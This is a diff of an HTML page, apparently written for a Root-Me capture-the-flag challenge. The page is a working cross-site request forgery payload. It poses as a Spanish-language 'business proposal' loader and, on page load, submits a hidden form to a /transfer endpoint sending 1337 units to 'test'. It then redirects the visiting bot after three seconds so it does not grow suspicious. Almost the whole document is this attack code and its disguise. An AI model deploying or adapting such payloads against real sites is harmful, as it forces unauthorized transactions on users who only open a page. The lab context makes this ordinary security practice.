@@ -1,24 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Cargando proyecto...</title>
+    <title>Cargando Propuesta de Negocio...</title>
 </head>
 <body>
-    <h1>Cargando la propuesta para the_dwalt00ns...</h1>
-    
-    <iframe name="hidden_iframe" id="hidden_iframe"></iframe>
+    <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
+        <h1>Procesando archivos adjuntos...</h1>
+        <p>Por favor, espere un momento mientras se carga el proyecto.</p>
+    </div>
 
-    <form id="csrf-form" action="https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/transfer" method="POST" target="hidden_iframe">
-        <input type="hidden" name="token" value="64fc28254300bf02000000" />
-        <input type="hidden" name="recipient" value="test" /> <input type="hidden" name="amount" value="10000" />
+    <iframe name="hidden_frame" id="hidden_frame" style="display:block; width: 100%; height: 100vh;"></iframe>
+
+    <form id="csrf_form" action="https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/transfer" method="POST" target="hidden_frame">
+        <input type="hidden" name="token" value="6634eb074300bf02000000" />
+        <input type="hidden" name="recipient" value="test" />
+        <input type="hidden" name="amount" value="1337" />
     </form>
 
     <script>
-        // Enviamos el formulario al iframe oculto
         window.onload = function() {
-            document.getElementById('csrf-form').submit();
-            console.log("Ataque enviado al iframe.");
+            // Enviamos el formulario automáticamente al cargar la página
+            document.getElementById('csrf_form').submit();
+            console.log("Ataque enviado.");
+            
+            // Opcional: Redirigir al bot a la página real después de 3 segundos para que no sospeche
+            setTimeout(function(){
+                window.location.href = "https://instance-019c1d39-1877-73ea-8b32-2bc46600599b.challenges.root-me.pro/rich-club";
+            }, 3000);
         };
     </script>
 </body>
 </html>
+
+
